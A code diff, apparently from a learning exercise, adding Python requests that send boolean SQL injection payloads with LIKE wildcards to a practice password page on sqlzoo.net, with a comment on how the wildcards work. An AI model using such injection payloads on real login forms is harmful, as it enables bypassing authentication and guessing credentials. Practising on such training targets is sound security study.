@@ -36,3 +36,8 @@ load = {"name" : "' OR EXISTS(SELECT * FROM users WHERE name='jake' AND password
 r = requests.get("https://sqlzoo.net/hack/passwd.pl", params = load)
 r.text
 
+load2 = {"name" : "' OR EXISTS(SELECT * FROM users WHERE name LIKE '%j%' AND password LIKE '%') AND ''='", "password" : "' OR EXISTS(SELECT * FROM users WHERE name LIKE '%j%' AND password LIKE '%') AND ''='"}
+r2 = requests.get("https://sqlzoo.net/hack/passwd.pl", params = load2)
+print(r2.text)
+# This works because the LIKE command uses % and _ as wildcards. The % wildcard matches any string, the _ wildcard matches a single character.
+
